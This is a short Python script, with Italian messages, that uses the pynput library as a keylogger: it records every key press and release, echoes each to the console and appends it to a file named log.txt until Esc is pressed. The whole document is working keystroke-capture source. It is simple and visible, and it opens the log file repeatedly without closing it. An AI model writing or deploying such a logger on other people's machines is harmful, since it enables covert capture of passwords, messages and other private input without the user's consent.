from pynput import keyboard

def on_press(key):
    t_press = f'il tasto premuto è: {key}\n'
    print(t_press[:-3])

    file_output = open('log.txt', 'a+')
    file_output.write(t_press)

def on_release(key):
    t_release = f'il tasto rilasciato è: {key}\n'
    print(t_release[:-3])
    file_output = open('log.txt', 'a+')
    file_output.write(t_release)

    if str(key) == "Key.esc":
        print('esco dal KEYLOGGER...')
        file_output.close()
        return False

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()